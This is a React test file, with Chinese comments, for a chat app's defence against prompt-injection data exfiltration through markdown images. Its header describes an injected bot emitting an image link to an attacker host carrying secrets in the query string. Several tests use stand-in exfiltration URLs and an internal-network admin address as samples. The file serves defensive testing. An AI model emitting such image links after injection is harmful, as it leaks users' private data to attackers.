/**
 * #764：bot 讀外部內容，被 prompt injection 後只要輸出 `![](https://攻擊者/collect?d=機密)`，瀏覽器一渲染就替它送出去。
 * 遠端圖片預設不載入：先畫帶網域的佔位，使用者點了才載入。
 */
import test from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { renderToStaticMarkup } from 'react-dom/server'
import Markdown from 'react-markdown'
import { MarkdownImage } from './MarkdownImage.tsx'
import { markdownComponents } from '../lib/markdownComponents.tsx'
import { markdownUrlTransform } from '../lib/markdownUrl.ts'

test('遠端圖片：只畫佔位（網域＋載入鈕），畫面上沒有任何 <img>，也沒有會自動發出請求的東西', () => {
  const html = renderToStaticMarkup(<MarkdownImage botId="b1" src="https://example.invalid/collect?d=SECRET" alt="x" />)
  assert.doesNotMatch(html, /<img/i)
  assert.match(html, /example\.invalid/)
  assert.match(html, /載入圖片/)
  assert.match(html, /<button/)
})

test('網址夾很長的參數時，佔位上多一句警告', () => {
  const html = renderToStaticMarkup(<MarkdownImage botId="b1" src={`https://example.invalid/c?d=${'x'.repeat(200)}`} />)
  assert.match(html, /參數/)
  assert.doesNotMatch(html, /<img/i)
})

test('data: 圖片是行內資料、不會發出請求，照常顯示', () => {
  const html = renderToStaticMarkup(<MarkdownImage botId="b1" src="data:image/png;base64,iVBORw0KGgo=" alt="dot" />)
  assert.match(html, /<img/i)
})

test('經 Markdown 渲染（含輸出中的氣泡走的 markdownComponents）也一樣：遠端圖片不出 <img>', () => {
  const md = '看這張 ![](https://example.invalid/collect?d=SECRET) 還有 <img src="https://example.invalid/x.png">'
  const html = renderToStaticMarkup(
    <Markdown components={markdownComponents('b1')} urlTransform={markdownUrlTransform}>
      {md}
    </Markdown>,
  )
  assert.doesNotMatch(html, /<img[^>]+example\.invalid/i)
})

test('輸出中的氣泡（LiveBubble）走 SafeMarkdown 並帶 botId，而 SafeMarkdown 的內容用 markdownComponents（同一個圖片元件）', () => {
  const src = readFileSync(new URL('./ChatPanel.tsx', import.meta.url), 'utf8')
  const live = src.slice(src.indexOf('export function LiveBubble'), src.indexOf('export function LiveReplyBubble'))
  assert.match(live, /<SafeMarkdown[^>]*botId=\{botId\}/)
  const content = readFileSync(new URL('./SafeMarkdownContent.tsx', import.meta.url), 'utf8')
  assert.match(content, /<Markdown[^>]*components=\{markdownComponents\(/)
})

test('index.html 有 CSP img-src：只放 self、data:、blob:（之後新增的渲染路徑也繞不過）', () => {
  const html = readFileSync(new URL('../../index.html', import.meta.url), 'utf8')
  const csp = html.match(/<meta[^>]+http-equiv="Content-Security-Policy"[^>]+content="([^"]+)"/i)?.[1] ?? ''
  assert.match(csp, /img-src 'self' data: blob:/)
  assert.doesNotMatch(csp, /img-src[^;]*https?:/)
})

test('本機／內網位址的佔位多一句警告；一般網址沒有', () => {
  const internal = renderToStaticMarkup(<MarkdownImage botId="b1" src="http://192.168.1.1/admin/reset.png" />)
  assert.match(internal, /本機／內網位址/)
  assert.doesNotMatch(internal, /<img/i)
  const plain = renderToStaticMarkup(<MarkdownImage botId="b1" src="https://img.shields.io/badge/ok-green" />)
  assert.doesNotMatch(plain, /本機／內網位址/)
})
